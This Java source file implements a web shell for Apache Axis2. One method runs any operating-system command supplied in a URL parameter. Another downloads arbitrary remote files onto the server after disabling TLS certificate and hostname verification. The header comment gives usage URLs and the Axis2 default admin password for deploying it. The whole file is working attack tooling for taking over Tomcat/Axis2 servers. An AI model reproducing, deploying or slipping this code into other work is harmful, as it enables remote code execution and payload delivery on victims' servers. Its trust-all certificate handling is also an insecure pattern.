/*
 * cmd.java cmd.aar
    Copyright (C)2012  Jeff Louisma @jefflouisma http://jefflouisma.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package cmdexec;
import java.io.*;
import java.net.*;
import javax.net.ssl.*;

/**
 * Usage: 
 *  Execute program: http://PATHTOAXIS2/cmdExec/run?cmd=COMMAND
 *  Download file: http://PATHTOAXIS2/cmdExec/get?site=http(s)://site/file.ext
 *      Files will be downloaded as download.file and must be renamed.
 *      Existing files will be overwritten. Enjoy :)
 * 
 *      Default axis2 username=admin password=axis2
 */
public class cmdExec {

	/**
	 * This is the run command.
	 */
	public String run(String cmd) throws InterruptedException {

		Process process;

		try {
			process = Runtime.getRuntime().exec(cmd);
			BufferedReader bri = new BufferedReader
				(new InputStreamReader(process.getInputStream()));
			BufferedReader bre = new BufferedReader
				(new InputStreamReader(process.getErrorStream()));
			String line;
			String answer = "";
			while ((line = bri.readLine()) != null) {
				answer += line + "\n"; 
			}
			bri.close();
			while ((line = bre.readLine()) != null) {
				answer += line + "\n"; 
			}
			bre.close();
			process.waitFor();
			return answer;

		}
		catch(IOException err) {
			String output = err.getMessage();
			return "JAVA PROBLEM: " + output;
		}
	}

	/**
	 * This is the download command 
	 */

	public String get(String site) throws InterruptedException {
		//IGNORE CERTIFICATE ISSUES
		TrustManager[] trustAllCerts = new TrustManager[]{
			new X509TrustManager() {
				public java.security.cert.X509Certificate[] getAcceptedIssuers() {
					return null;
				}
				public void checkClientTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
				}
				public void checkServerTrusted(
						java.security.cert.X509Certificate[] certs, String authType) {
				}
			}
		};

		// Install the all-trusting trust manager
		try {
			SSLContext sc = SSLContext.getInstance("SSL");
			sc.init(null, trustAllCerts, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                        HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier(){
                        public boolean verify(String string,SSLSession ssls) {
                            return true;
                            }
                        });
                    } 
                catch (Exception e) {
		}  

		URL url; 
		URLConnection con; 
		DataInputStream dis; 
		FileOutputStream fos; 
		byte[] fileData;  
		try {
			url = new URL(site);
			con = url.openConnection(); 
			dis = new DataInputStream(con.getInputStream()); 
			fileData = new byte[con.getContentLength()]; 
			for (int x = 0; x < fileData.length; x++) { 
				fileData[x] = dis.readByte();
			}
			dis.close(); 
			fos = new FileOutputStream(new File("download.file")); 
			fos.write(fileData);  
			fos.close(); 
		}
		catch(MalformedURLException m) {
			String output = m.getMessage();
			return "JAVA PROBLEM: " + output;
		}
		catch(IOException io) {
			String output = io.getMessage();
			return "JAVA PROBLEM: " + output;
		}
		return "The file " + site +" was downloaded as 'download.file'\n "
			+ "Please rename this file before downloading another file\n"
			+ "Rename on linux: mv download.file something.ext Rename on Windows: move download.file something.ext \n"
			+ "Location is usually the root tomcat directory use 'run?cmd=' to find it. :)";

	}

}